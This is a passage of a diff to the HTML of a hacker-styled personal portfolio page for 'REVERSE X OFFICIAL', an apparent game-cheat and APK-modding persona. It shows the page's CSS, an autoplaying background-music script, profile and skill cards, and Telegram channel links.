@@ -1,962 +1,1882 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>REVERSE X OFFICIAL | Cyber Portfolio</title>
-
-<style>
-* {
-    margin: 0;
-    padding: 0;
-    box-sizing: border-box;
-    font-family: 'Courier New', monospace;
-}
-
-body {
-    background: #0a0a0a;
-    color: #00ff41;
-    overflow-x: hidden;
-    cursor: none;
-}
-
-#matrix {
-    position: fixed;
-    top: 0;
-    left: 0;
-    width: 100%;
-    height: 100%;
-    z-index: -2;
-    opacity: 99.9;
-}
-
-.overlay {
-    position: fixed;
-    top: 0;
-    left: 0;
-    width: 100%;
-    height: 100%;
-    background: rgba(0, 0, 0, 0.75);
-    z-index: -1;
-}
-
-.scanlines {
-    position: fixed;
-    top: 0;
-    left: 0;
-    width: 100%;
-    height: 100%;
-    pointer-events: none;
-    z-index: 9999;
-    background: repeating-linear-gradient(0deg,
-        rgba(0, 255, 65, 0) 0px,
-        rgba(0, 255, 65, 0) 2px,
-        rgba(0, 255, 65, 0.015) 2px,
-        rgba(0, 255, 65, 0.015) 4px);
-}
-
-.cursor {
-    position: fixed;
-    width: 20px;
-    height: 20px;
-    border: 2px solid #00ff41;
-    border-radius: 50%;
-    pointer-events: none;
-    transform: translate(-50%, -50%);
-    box-shadow: 0 0 30px #00ff41, inset 0 0 15px #00ff41;
-    z-index: 999;
-    transition: width 0.1s, height 0.1s;
-}
-
-.cursor-dot {
-    position: fixed;
-    width: 5px;
-    height: 5px;
-    background: #00ff41;
-    border-radius: 50%;
-    pointer-events: none;
-    transform: translate(-50%, -50%);
-    box-shadow: 0 0 20px #00ff41;
-    z-index: 1000;
-}
-
-.hero {
-    min-height: 100vh;
-    display: flex;
-    flex-direction: column;
-    justify-content: center;
-    align-items: center;
-    text-align: center;
-    padding: 20px;
-    position: relative;
-    z-index: 1;
-}
-
-.hero::before {
-    content: '';
-    position: absolute;
-    top: 10px;
-    left: 10px;
-    right: 10px;
-    bottom: 10px;
-    border: 1px solid rgba(0, 255, 65, 0.1);
-    pointer-events: none;
-    animation: borderGlitch 3s infinite;
-}
-
-@keyframes borderGlitch {
-    0%, 90%, 100% { opacity: 0.1; }
-    92% { opacity: 0.4; }
-    94% { opacity: 0.1; }
-    96% { opacity: 0.4; }
-}
-
-.logo {
-    width: 200px;
-    height: auto;
-    margin-bottom: 10px;
-    filter: drop-shadow(0 0 50px #00ff41);
-    animation: glow 2s infinite alternate;
-}
-
-.logo img {
-    width: 100%;
-    height: auto;
-    display: block;
-}
-
-@keyframes glow {
-    from { filter: drop-shadow(0 0 20px #00ff41); }
-    to { filter: drop-shadow(0 0 80px #00ff41); }
-}
-
-.hero h1 {
-    font-size: 4rem;
-    margin-top: 20px;
-    text-shadow: 0 0 40px #00ff41;
-    letter-spacing: 8px;
-    animation: glitchText 3s infinite;
-}
-
-@keyframes glitchText {
-    0%, 90%, 100% { text-shadow: 0 0 40px #00ff41; }
-    92% { text-shadow: -3px 0 red, 3px 0 blue, 0 0 50px #00ff41; }
-    94% { text-shadow: 3px 0 red, -3px 0 blue, 0 0 50px #00ff41; }
-    96% { text-shadow: -2px 0 red, 2px 0 blue, 0 0 50px #00ff41; }
-}
-
-.typing-container {
-    font-size: 1.2rem;
-    margin-top: 10px;
-    min-height: 2em;
-    color: #66ff99;
-}
-
-.typing-text {
-    display: inline-block;
-    border-right: 2px solid #00ff41;
-    padding-right: 5px;
-    animation: blink-cursor 0.8s step-end infinite;
-}
-
-@keyframes blink-cursor {
-    50% { border-color: transparent; }
-}
-
-.btns {
-    margin-top: 30px;
-    display: flex;
-    gap: 20px;
-    flex-wrap: wrap;
-    justify-content: center;
-}
-
-.btn {
-    padding: 14px 35px;
-    border: 2px solid #00ff41;
-    border-radius: 0;
-    background: transparent;
-    color: #00ff41;
-    font-weight: bold;
-    cursor: pointer;
-    transition: 0.3s;
-    font-family: 'Courier New', monospace;
-    letter-spacing: 2px;
-    text-transform: uppercase;
-    position: relative;
-    overflow: hidden;
-    z-index: 2;
-}
-
-.btn::before {
-    content: '';
-    position: absolute;
-    top: 0;
-    left: -100%;
-    width: 100%;
-    height: 100%;
-    background: #00ff41;
-    transition: 0.4s;
-    z-index: -1;
-}
-
-.btn:hover::before {
-    left: 0;
-}
-
-.btn:hover {
-    color: #000;
-    box-shadow: 0 0 50px #00ff41;
-    transform: translateY(-3px);
-}
-
-.terminal-card {
-    width: 90%;
-    max-width: 900px;
-    margin: 30px auto;
-    padding: 0;
-    background: rgba(0, 10, 0, 0.9);
-    border: 1px solid rgba(0, 255, 65, 0.15);
-    border-radius: 8px;
-    box-shadow: 0 0 40px rgba(0, 255, 65, 0.05);
-    overflow: hidden;
-    position: relative;
-    z-index: 1;
-}
-
-.terminal-header {
-    background: rgba(0, 255, 65, 0.05);
-    padding: 10px 20px;
-    border-bottom: 1px solid rgba(0, 255, 65, 0.1);
-    display: flex;
-    align-items: center;
-    gap: 10px;
-}
-
-.terminal-dot {
-    width: 12px;
-    height: 12px;
-    border-radius: 50%;
-    display: inline-block;
-}
-
-.dot-red { background: #ff4444; }
-.dot-yellow { background: #ffaa00; }
-.dot-green { background: #00ff41; }
-
-.terminal-title {
-    color: #66ff99;
-    font-size: 0.8rem;
-    letter-spacing: 1px;
-    margin-left: 10px;
-}
-
-.terminal-body {
-    padding: 25px;
-    font-family: 'Courier New', monospace;
-}
-
-.profile-grid {
-    display: grid;
-    grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
-    gap: 15px;
-}
-
-.profile-item {
-    padding: 15px;
-    border: 1px solid rgba(0, 255, 65, 0.1);
-    border-radius: 4px;
-    background: rgba(0, 255, 65, 0.02);
-    transition: 0.3s;
-}
-
-.profile-item:hover {
-    border-color: #00ff41;
-    box-shadow: 0 0 20px rgba(0, 255, 65, 0.08);
-}
-
-.profile-item .label {
-    color: #66ff99;
-    font-size: 0.7rem;
-    letter-spacing: 1px;
-}
-
-.profile-item .value {
-    color: #00ff41;
-    font-size: 1rem;
-    margin-top: 5px;
-}
-
-.skill {
-    margin-bottom: 18px;
-}
-
-.skill p {
-    margin-bottom: 6px;
-    display: flex;
-    justify-content: space-between;
-    font-size: 0.9rem;
-}
-
-.skill p .skill-percent {
-    color: #66ff99;
-}
-
-.bar {
-    width: 100%;
-    height: 6px;
-    background: rgba(0, 255, 65, 0.08);
-    border-radius: 0;
-    overflow: hidden;
-}
-
-.fill {
-    height: 100%;
-    background: #00ff41;
-    box-shadow: 0 0 20px #00ff41;
-    width: 0%;
-    transition: width 1.5s cubic-bezier(0.25, 0.46, 0.45, 0.94);
-}
-
-.terminal-logs {
-    background: rgba(0, 10, 0, 0.5);
-    padding: 15px;
-    font-family: 'Courier New', monospace;
-    line-height: 2;
-    min-height: 250px;
-    max-height: 350px;
-    overflow-y: auto;
-    border-left: 2px solid #00ff41;
-}
-
-.terminal-logs::-webkit-scrollbar {
-    width: 4px;
-}
-
-.terminal-logs::-webkit-scrollbar-track {
-    background: rgba(0, 255, 65, 0.05);
-}
-
-.terminal-logs::-webkit-scrollbar-thumb {
-    background: #00ff41;
-}
-
-.terminal-line {
-    opacity: 0;
-    animation: terminalFade 0.5s forwards;
-}
-
-.terminal-line .prompt {
-    color: #66ff99;
-}
-
-.terminal-line .command {
-    color: #00ff41;
-}
-
-.terminal-line .success {
-    color: #00ff41;
-}
-
-.terminal-line .warning {
-    color: #ffaa00;
-}
-
-.terminal-line .error {
-    color: #ff4444;
-}
-
-@keyframes terminalFade {
-    from {
-        opacity: 0;
-        transform: translateX(-10px);
-    }
-    to {
-        opacity: 1;
-        transform: translateX(0);
-    }
-}
-
-.file-explorer {
-    background: rgba(0, 10, 0, 0.5);
-    padding: 15px;
-    font-family: 'Courier New', monospace;
-    line-height: 2;
-    min-height: 200px;
-    max-height: 350px;
-    overflow-y: auto;
-    border-left: 2px solid #00ff41;
-}
-
-.file-explorer::-webkit-scrollbar {
-    width: 4px;
-}
-
-.file-explorer::-webkit-scrollbar-track {
-    background: rgba(0, 255, 65, 0.05);
-}
-
-.file-explorer::-webkit-scrollbar-thumb {
-    background: #00ff41;
-}
-
-.explorer-line {
-    opacity: 0;
-    animation: terminalFade 0.5s forwards;
-}
-
-.folder {
-    color: #ffaa00;
-    font-weight: bold;
-    cursor: pointer;
-}
-
-.folder:hover {
-    text-shadow: 0 0 10px #ffaa00;
-}
-
-.file {
-    color: #66ff99;
-}
-
-.file-hide {
-    display: none;
-}
-
-.explorer-cursor {
-    display: inline-block;
-    width: 8px;
-    height: 16px;
-    background: #00ff41;
-    animation: blink 0.8s step-end infinite;
-    margin-left: 2px;
-}
-
-@keyframes blink {
-    50% { opacity: 0; }
-}
-
-.status-bar {
-    position: fixed;
-    bottom: 0;
-    left: 0;
-    width: 100%;
-    background: rgba(0, 0, 0, 0.98);
-    border-top: 1px solid rgba(0, 255, 65, 0.15);
-    padding: 8px 20px;
-    display: flex;
-    justify-content: space-between;
-    font-size: 0.7rem;
-    color: #66ff99;
-    z-index: 100;
-    font-family: 'Courier New', monospace;
-    letter-spacing: 1px;
-}
-
-.status-item {
-    display: flex;
-    align-items: center;
-    gap: 8px;
-}
-
-.status-dot {
-    width: 6px;
-    height: 6px;
-    border-radius: 50%;
-    background: #00ff41;
-    animation: blink 1s step-end infinite;
-}
-
-.status-dot.off {
-    background: #ff4444;
-    animation: none;
-}
-
-footer {
-    text-align: center;
-    padding: 30px;
-    font-size: 0.8rem;
-    color: rgba(0, 255, 65, 0.3);
-    letter-spacing: 2px;
-    position: relative;
-    z-index: 1;
-}
-
-@media (max-width: 768px) {
-    .hero h1 {
-        font-size: 2.5rem;
-        letter-spacing: 4px;
-    }
-    .logo {
-        width: 150px;
-    }
-    .terminal-body {
-        padding: 15px;
-    }
-    .profile-grid {
-        grid-template-columns: 1fr 1fr;
-    }
-    .status-bar {
-        font-size: 0.5rem;
-        padding: 5px 10px;
-        flex-wrap: wrap;
-    }
-    .cursor, .cursor-dot {
-        display: none;
-    }
-}
-</style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>REVERSE X OFFICIAL | Cyber Portfolio</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Courier New', monospace;
+        }
+        body {
+            background: #0a0a0a;
+            color: #00ff41;
+            overflow-x: hidden;
+            cursor: none;
+        }
+        #matrix {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: -2;
+            opacity: 99.9;
+        }
+        .overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.85);
+            z-index: -1;
+        }
+        .scanlines {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            pointer-events: none;
+            z-index: 9999;
+            background: repeating-linear-gradient(0deg,
+                rgba(0, 255, 65, 0) 0px,
+                rgba(0, 255, 65, 0) 2px,
+                rgba(0, 255, 65, 0.015) 2px,
+                rgba(0, 255, 65, 0.015) 4px);
+        }
+        .cursor {
+            position: fixed;
+            width: 20px;
+            height: 20px;
+            border: 2px solid #00ff41;
+            border-radius: 50%;
+            pointer-events: none;
+            transform: translate(-50%, -50%);
+            box-shadow: 0 0 30px #00ff41, inset 0 0 15px #00ff41;
+            z-index: 999;
+            transition: width 0.1s, height 0.1s;
+        }
+        .cursor-dot {
+            position: fixed;
+            width: 5px;
+            height: 5px;
+            background: #00ff41;
+            border-radius: 50%;
+            pointer-events: none;
+            transform: translate(-50%, -50%);
+            box-shadow: 0 0 20px #00ff41;
+            z-index: 1000;
+        }
+        .hero {
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            text-align: center;
+            padding: 20px;
+            position: relative;
+            z-index: 1;
+        }
+        .hero::before {
+            content: '';
+            position: absolute;
+            top: 10px;
+            left: 10px;
+            right: 10px;
+            bottom: 10px;
+            border: 1px solid rgba(0, 255, 65, 0.1);
+            pointer-events: none;
+            animation: borderGlitch 3s infinite;
+        }
+        @keyframes borderGlitch {
+            0%, 90%, 100% { opacity: 0.1; }
+            92% { opacity: 0.4; }
+            94% { opacity: 0.1; }
+            96% { opacity: 0.4; }
+        }
+        .logo {
+            width: 200px;
+            height: auto;
+            margin-bottom: 10px;
+            filter: drop-shadow(0 0 50px #00ff41);
+            animation: glow 2s infinite alternate;
+        }
+        .logo img {
+            width: 100%;
+            height: auto;
+            display: block;
+        }
+        @keyframes glow {
+            from { filter: drop-shadow(0 0 20px #00ff41); }
+            to { filter: drop-shadow(0 0 80px #00ff41); }
+        }
+        .hero h1 {
+            font-size: 4rem;
+            margin-top: 20px;
+            text-shadow: 0 0 40px #00ff41;
+            letter-spacing: 8px;
+            animation: glitchText 3s infinite;
+        }
+        @keyframes glitchText {
+            0%, 90%, 100% { text-shadow: 0 0 40px #00ff41; }
+            92% { text-shadow: -3px 0 red, 3px 0 blue, 0 0 50px #00ff41; }
+            94% { text-shadow: 3px 0 red, -3px 0 blue, 0 0 50px #00ff41; }
+            96% { text-shadow: -2px 0 red, 2px 0 blue, 0 0 50px #00ff41; }
+        }
+        .typing-container {
+            font-size: 1.2rem;
+            margin-top: 10px;
+            min-height: 2em;
+            color: #66ff99;
+        }
+        .typing-text {
+            display: inline-block;
+            border-right: 2px solid #00ff41;
+            padding-right: 5px;
+            animation: blink-cursor 0.8s step-end infinite;
+        }
+        @keyframes blink-cursor {
+            50% { border-color: transparent; }
+        }
+        .btns {
+            margin-top: 30px;
+            display: flex;
+            gap: 20px;
+            flex-wrap: wrap;
+            justify-content: center;
+        }
+        .btn {
+            padding: 14px 35px;
+            border: 2px solid #00ff41;
+            border-radius: 0;
+            background: transparent;
+            color: #00ff41;
+            font-weight: bold;
+            cursor: pointer;
+            transition: 0.3s;
+            font-family: 'Courier New', monospace;
+            letter-spacing: 2px;
+            text-transform: uppercase;
+            position: relative;
+            overflow: hidden;
+            z-index: 2;
+        }
+        .btn::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: #00ff41;
+            transition: 0.4s;
+            z-index: -1;
+        }
+        .btn:hover::before {
+            left: 0;
+        }
+        .btn:hover {
+            color: #000;
+            box-shadow: 0 0 50px #00ff41;
+            transform: translateY(-3px);
+        }
+        .terminal-card {
+            width: 90%;
+            max-width: 900px;
+            margin: 30px auto;
+            padding: 0;
+            background: rgba(0, 10, 0, 0.9);
+            border: 1px solid rgba(0, 255, 65, 0.15);
+            border-radius: 8px;
+            box-shadow: 0 0 40px rgba(0, 255, 65, 0.05);
+            overflow: hidden;
+            position: relative;
+            z-index: 1;
+        }
+        .terminal-header {
+            background: rgba(0, 255, 65, 0.05);
+            padding: 10px 20px;
+            border-bottom: 1px solid rgba(0, 255, 65, 0.1);
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        .terminal-dot {
+            width: 12px;
+            height: 12px;
+            border-radius: 50%;
+            display: inline-block;
+        }
+        .dot-red { background: #ff4444; }
+        .dot-yellow { background: #ffaa00; }
+        .dot-green { background: #00ff41; }
+        .terminal-title {
+            color: #66ff99;
+            font-size: 0.8rem;
+            letter-spacing: 1px;
+            margin-left: 10px;
+        }
+        .terminal-body {
+            padding: 25px;
+            font-family: 'Courier New', monospace;
+        }
+        .profile-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 15px;
+        }
+        .profile-item {
+            padding: 15px;
+            border: 1px solid rgba(0, 255, 65, 0.1);
+            border-radius: 4px;
+            background: rgba(0, 255, 65, 0.02);
+            transition: 0.3s;
+        }
+        .profile-item:hover {
+            border-color: #00ff41;
+            box-shadow: 0 0 20px rgba(0, 255, 65, 0.08);
+        }
+        .profile-item .label {
+            color: #66ff99;
+            font-size: 0.7rem;
+            letter-spacing: 1px;
+        }
+        .profile-item .value {
+            color: #00ff41;
+            font-size: 1rem;
+            margin-top: 5px;
+        }
+        .skill {
+            margin-bottom: 18px;
+        }
+        .skill p {
+            margin-bottom: 6px;
+            display: flex;
+            justify-content: space-between;
+            font-size: 0.9rem;
+        }
+        .skill p .skill-percent {
+            color: #66ff99;
+        }
+        .bar {
+            width: 100%;
+            height: 6px;
+            background: rgba(0, 255, 65, 0.08);
+            border-radius: 0;
+            overflow: hidden;
+        }
+        .fill {
+            height: 100%;
+            background: #00ff41;
+            box-shadow: 0 0 20px #00ff41;
+            width: 0%;
+            transition: width 1.5s cubic-bezier(0.25, 0.46, 0.45, 0.94);
+        }
+        .terminal-logs {
+            background: rgba(0, 10, 0, 0.5);
+            padding: 15px;
+            font-family: 'Courier New', monospace;
+            line-height: 2;
+            min-height: 250px;
+            max-height: 350px;
+            overflow-y: auto;
+            border-left: 2px solid #00ff41;
+        }
+        .terminal-logs::-webkit-scrollbar {
+            width: 4px;
+        }
+        .terminal-logs::-webkit-scrollbar-track {
+            background: rgba(0, 255, 65, 0.05);
+        }
+        .terminal-logs::-webkit-scrollbar-thumb {
+            background: #00ff41;
+        }
+        .terminal-line {
+            opacity: 0;
+            animation: terminalFade 0.5s forwards;
+        }
+        .terminal-line .prompt {
+            color: #66ff99;
+        }
+        .terminal-line .command {
+            color: #00ff41;
+        }
+        .terminal-line .success {
+            color: #00ff41;
+        }
+        .terminal-line .warning {
+            color: #ffaa00;
+        }
+        .terminal-line .error {
+            color: #ff4444;
+        }
+        @keyframes terminalFade {
+            from {
+                opacity: 0;
+                transform: translateX(-10px);
+            }
+            to {
+                opacity: 1;
+                transform: translateX(0);
+            }
+        }
+        .file-explorer {
+            background: rgba(0, 10, 0, 0.5);
+            padding: 15px;
+            font-family: 'Courier New', monospace;
+            line-height: 2;
+            min-height: 200px;
+            max-height: 350px;
+            overflow-y: auto;
+            border-left: 2px solid #00ff41;
+        }
+        .file-explorer::-webkit-scrollbar {
+            width: 4px;
+        }
+        .file-explorer::-webkit-scrollbar-track {
+            background: rgba(0, 255, 65, 0.05);
+        }
+        .file-explorer::-webkit-scrollbar-thumb {
+            background: #00ff41;
+        }
+        .explorer-line {
+            opacity: 0;
+            animation: terminalFade 0.5s forwards;
+        }
+        .folder {
+            color: #ffaa00;
+            font-weight: bold;
+            cursor: pointer;
+        }
+        .folder:hover {
+            text-shadow: 0 0 10px #ffaa00;
+        }
+        .file {
+            color: #66ff99;
+        }
+        .file-hide {
+            display: none;
+        }
+        .explorer-cursor {
+            display: inline-block;
+            width: 8px;
+            height: 16px;
+            background: #00ff41;
+            animation: blink 0.8s step-end infinite;
+            margin-left: 2px;
+        }
+        @keyframes blink {
+            50% { opacity: 0; }
+        }
+        .status-bar {
+            position: fixed;
+            bottom: 0;
+            left: 0;
+            width: 100%;
+            background: rgba(0, 0, 0, 0.98);
+            border-top: 1px solid rgba(0, 255, 65, 0.15);
+            padding: 8px 20px;
+            display: flex;
+            justify-content: space-between;
+            font-size: 0.7rem;
+            color: #66ff99;
+            z-index: 100;
+            font-family: 'Courier New', monospace;
+            letter-spacing: 1px;
+        }
+        .status-item {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+        .status-dot {
+            width: 6px;
+            height: 6px;
+            border-radius: 50%;
+            background: #00ff41;
+            animation: blink 1s step-end infinite;
+        }
+        .status-dot.off {
+            background: #ff4444;
+            animation: none;
+        }
+        footer {
+            text-align: center;
+            padding: 30px;
+            font-size: 0.8rem;
+            color: rgba(0, 255, 65, 0.3);
+            letter-spacing: 2px;
+            position: relative;
+            z-index: 1;
+        }
+        @media (max-width: 768px) {
+            .hero h1 {
+                font-size: 2.5rem;
+                letter-spacing: 4px;
+            }
+            .logo {
+                width: 150px;
+            }
+            .terminal-body {
+                padding: 15px;
+            }
+            .profile-grid {
+                grid-template-columns: 1fr 1fr;
+            }
+            .status-bar {
+                font-size: 0.5rem;
+                padding: 5px 10px;
+                flex-wrap: wrap;
+            }
+            .cursor, .cursor-dot {
+                display: none;
+            }
+        }
+        .converter-layout {
+            display: flex;
+            gap: 10px;
+            flex-wrap: wrap;
+        }
+        .converter-box {
+            flex: 1;
+            min-width: 200px;
+        }
+        .converter-box .box-label {
+            color: #66ff99;
+            font-size: 0.7rem;
+            letter-spacing: 1px;
+            margin-bottom: 5px;
+        }
+        .converter-box textarea {
+            width: 100%;
+            padding: 12px;
+            background: #0a0a0a;
+            border: 1px solid #00ff41;
+            color: #00ff41;
+            font-family: 'Courier New', monospace;
+            font-size: 0.9rem;
+            border-radius: 4px;
+            min-height: 120px;
+            resize: vertical;
+            caret-color: #00ff41;
+        }
+        .converter-box pre {
+            background: #0a0a0a;
+            border: 1px solid #00ff41;
+            border-radius: 4px;
+            padding: 12px;
+            color: #66ff99;
+            font-family: 'Courier New', monospace;
+            font-size: 0.9rem;
+            min-height: 120px;
+            overflow-x: auto;
+            white-space: pre-wrap;
+            word-wrap: break-word;
+            margin: 0;
+        }
+        .converter-controls {
+            display: flex;
+            gap: 10px;
+            flex-wrap: wrap;
+            align-items: center;
+        }
+        .converter-controls select {
+            padding: 10px 20px;
+            background: #0a0a0a;
+            border: 1px solid #00ff41;
+            color: #00ff41;
+            font-family: 'Courier New', monospace;
+            font-size: 0.9rem;
+            border-radius: 4px;
+            cursor: pointer;
+        }
+        .converter-controls .live-badge {
+            color: #66ff99;
+            font-size: 0.7rem;
+            margin-left: auto;
+        }
+        #hackOutput {
+            scrollbar-width: thin;
+            scrollbar-color: #00ff41 #0a0a0a;
+        }
+        #hackOutput::-webkit-scrollbar {
+            width: 6px;
+        }
+        #hackOutput::-webkit-scrollbar-track {
+            background: #0a0a0a;
+        }
+        #hackOutput::-webkit-scrollbar-thumb {
+            background: #00ff41;
+            border-radius: 3px;
+        }
+        #hackOutput::-webkit-scrollbar-thumb:hover {
+            background: #66ff99;
+        }
+    </style>
 </head>
-
 <body>
 
-<canvas id="matrix"></canvas>
-<div class="overlay"></div>
-<div class="scanlines"></div>
+    <!-- ============================================== -->
+    <!-- BACKGROUND MUSIC - AUTO START AFTER 5 SECONDS -->
+    <!-- ============================================== -->
+    <audio id="bgMusic" loop style="display:none;">
+        <source src="https://www.soundhelix.com/examples/mp3/SoundHelix-Song-1.mp3" type="audio/mpeg">
+    </audio>
+    <script>
+        const audio = document.getElementById('bgMusic');
+        audio.volume = 0.3;
+        setTimeout(function() {
+            audio.play().catch(() => {});
+        }, 5000);
+        document.addEventListener('keydown', function(e) {
+            if (e.key === 'm' || e.key === 'M') audio.muted = !audio.muted;
+        });
+    </script>
 
-<div class="cursor" id="cursor"></div>
-<div class="cursor-dot" id="cursorDot"></div>
+    <canvas id="matrix"></canvas>
+    <div class="overlay"></div>
+    <div class="scanlines"></div>
 
-<div class="status-bar">
-    <div class="status-item">
-        <span class="status-dot"></span>
-        <span>SYSTEM ONLINE</span>
-    </div>
-    <div class="status-item">
-        <span>⚡ ROOT ACCESS</span>
-    </div>
-    <div class="status-item">
-        <span>🔒 ENCRYPTED</span>
-    </div>
-    <div class="status-item">
-        <span>🛡️ FIREWALL ACTIVE</span>
-    </div>
-    <div class="status-item" id="clockDisplay">
-        <span>⏰ 00:00:00</span>
-    </div>
-</div>
+    <div class="cursor" id="cursor"></div>
+    <div class="cursor-dot" id="cursorDot"></div>
 
-<section class="hero">
-    <div class="logo">
-        <img src="https://i.postimg.cc/SKCNFyQh/file-00000000a1dc821189a49d399de19d10.png" alt="REVERSE CHEATS">
+    <!-- ============================================== -->
+    <!-- STATUS BAR -->
+    <!-- ============================================== -->
+    <div class="status-bar">
+        <div class="status-item">
+            <span class="status-dot"></span>
+            <span>SYSTEM ONLINE</span>
+        </div>
+        <div class="status-item">
+            <span>⚡ ROOT ACCESS</span>
+        </div>
+        <div class="status-item">
+            <span>🔒 ENCRYPTED</span>
+        </div>
+        <div class="status-item">
+            <span>🛡️ FIREWALL ACTIVE</span>
+        </div>
+        <div class="status-item" id="clockDisplay">
+            <span>⏰ 00:00:00</span>
+        </div>
+        <div class="status-item" id="musicControl" style="cursor: pointer;">
+            <span>🎵</span>
+            <span>MUSIC</span>
+        </div>
+        <div class="status-item" id="hackStatus" style="cursor: pointer;">
+            <span>🕵️</span>
+            <span>HACK</span>
+        </div>
     </div>
 
-    <h1>REVERSE X OFFICIAL</h1>
+    <!-- ============================================== -->
+    <!-- HERO SECTION -->
+    <!-- ============================================== -->
+    <section class="hero">
+        <div class="logo">
+            <img src="https://i.postimg.cc/SKCNFyQh/file-00000000a1dc821189a49d399de19d10.png" alt="REVERSE CHEATS">
+        </div>
+        <h1>REVERSE X OFFICIAL</h1>
+        <div class="typing-container">
+            <span class="typing-text" id="typingText"></span>
+        </div>
+        <div class="btns">
+            <button class="btn" onclick="window.open('https://t.me/ReverseXCheats')">▶ JOIN CHANNEL</button>
+            <button class="btn" onclick="window.open('https://t.me/REVERSE_X_OFFICIAL')">▶ CONTACT ME</button>
+        </div>
+    </section>
 
-    <div class="typing-container">
-        <span class="typing-text" id="typingText"></span>
-    </div>
-
-    <div class="btns">
-        <button class="btn" onclick="window.open('https://t.me/ReverseXCheats')">▶ JOIN CHANNEL</button>
-        <button class="btn" onclick="window.open('https://t.me/REVERSE_X_OFFICIAL')">▶ CONTACT ME</button>
-    </div>
-</section>
-
-<div class="terminal-card">
-    <div class="terminal-header">
-        <span class="terminal-dot dot-red"></span>
-        <span class="terminal-dot dot-yellow"></span>
-        <span class="terminal-dot dot-green"></span>
-        <span class="terminal-title">PROFILE — DATA</span>
-    </div>
-    <div class="terminal-body">
-        <div class="profile-grid">
-            <div class="profile-item">
-                <div class="label">👤 NAME</div>
-                <div class="value">REVERSE</div>
+    <!-- ============================================== -->
+    <!-- PROFILE SECTION -->
+    <!-- ============================================== -->
+    <div class="terminal-card">
+        <div class="terminal-header">
+            <span class="terminal-dot dot-red"></span>
+            <span class="terminal-dot dot-yellow"></span>
+            <span class="terminal-dot dot-green"></span>
+            <span class="terminal-title">PROFILE — DATA</span>
+        </div>
+        <div class="terminal-body">
+            <div class="profile-grid">
+                <div class="profile-item">
+                    <div class="label">👤 NAME</div>
+                    <div class="value">REVERSE</div>
+                </div>
+                <div class="profile-item">
+                    <div class="label">🎂 BIRTHDAY</div>
+                    <div class="value">JANUARY 20</div>
+                </div>
+                <div class="profile-item">
+                    <div class="label">💻 PASSION</div>
+                    <div class="value">REVERSE ENGINEERING</div>
+                </div>
+                <div class="profile-item">
+                    <div class="label">🚀 GOAL</div>
+                    <div class="value">DANGEROUS HACKER</div>
+                </div>
+                <div class="profile-item">
+                    <div class="label">🌐 STATUS</div>
+                    <div class="value">🟢 ACTIVE</div>
+                </div>
+                <div class="profile-item">
+                    <div class="label">🔑 ACCESS</div>
+                    <div class="value">LEVEL 5 GRANTED</div>
+                </div>
             </div>
-            <div class="profile-item">
-                <div class="label">🎂 BIRTHDAY</div>
-                <div class="value">JANUARY 20</div>
+        </div>
+    </div>
+
+    <!-- ============================================== -->
+    <!-- SKILL SECTION -->
+    <!-- ============================================== -->
+    <div class="terminal-card" id="skillsSection">
+        <div class="terminal-header">
+            <span class="terminal-dot dot-red"></span>
+            <span class="terminal-dot dot-yellow"></span>
+            <span class="terminal-dot dot-green"></span>
+            <span class="terminal-title">SKILL MATRIX — LOADING</span>
+        </div>
+        <div class="terminal-body">
+            <div class="skill">
+                <p>Reverse Engineering <span class="skill-percent">98%</span></p>
+                <div class="bar"><div class="fill" data-width="98"></div></div>
             </div>
-            <div class="profile-item">
-                <div class="label">💻 PASSION</div>
-                <div class="value">REVERSE ENGINEERING</div>
+            <div class="skill">
+                <p>APK Modding <span class="skill-percent">96%</span></p>
+                <div class="bar"><div class="fill" data-width="96"></div></div>
             </div>
-            <div class="profile-item">
-                <div class="label">🚀 GOAL</div>
-                <div class="value">DANGEROUS HACKER</div>
+            <div class="skill">
+                <p>Python & Automation <span class="skill-percent">95%</span></p>
+                <div class="bar"><div class="fill" data-width="95"></div></div>
             </div>
-            <div class="profile-item">
-                <div class="label">🌐 STATUS</div>
-                <div class="value">🟢 ACTIVE</div>
+            <div class="skill">
+                <p>Telegram Bots <span class="skill-percent">97%</span></p>
+                <div class="bar"><div class="fill" data-width="97"></div></div>
             </div>
-            <div class="profile-item">
-                <div class="label">🔑 ACCESS</div>
-                <div class="value">LEVEL 5 GRANTED</div>
+            <div class="skill">
+                <p>Web Development <span class="skill-percent">92%</span></p>
+                <div class="bar"><div class="fill" data-width="92"></div></div>
+            </div>
+            <div class="skill">
+                <p>Firebase & Cloud <span class="skill-percent">90%</span></p>
+                <div class="bar"><div class="fill" data-width="90"></div></div>
+            </div>
+            <div class="skill">
+                <p>Cyber Security <span class="skill-percent">93%</span></p>
+                <div class="bar"><div class="fill" data-width="93"></div></div>
+            </div>
+            <div class="skill">
+                <p>UI/UX Design <span class="skill-percent">87%</span></p>
+                <div class="bar"><div class="fill" data-width="87"></div></div>
+            </div>
+            <div class="skill">
+                <p>Game Modding <span class="skill-percent">94%</span></p>
+                <div class="bar"><div class="fill" data-width="94"></div></div>
+            </div>
+            <div class="skill">
+                <p>Malware Analysis <span class="skill-percent">91%</span></p>
+                <div class="bar"><div class="fill" data-width="91"></div></div>
             </div>
         </div>
     </div>
-</div>
 
-<div class="terminal-card" id="skillsSection">
-    <div class="terminal-header">
-        <span class="terminal-dot dot-red"></span>
-        <span class="terminal-dot dot-yellow"></span>
-        <span class="terminal-dot dot-green"></span>
-        <span class="terminal-title">SKILL MATRIX — LOADING</span>
-    </div>
-    <div class="terminal-body">
-        <div class="skill">
-            <p>Reverse Engineering <span class="skill-percent">98%</span></p>
-            <div class="bar"><div class="fill" data-width="98"></div></div>
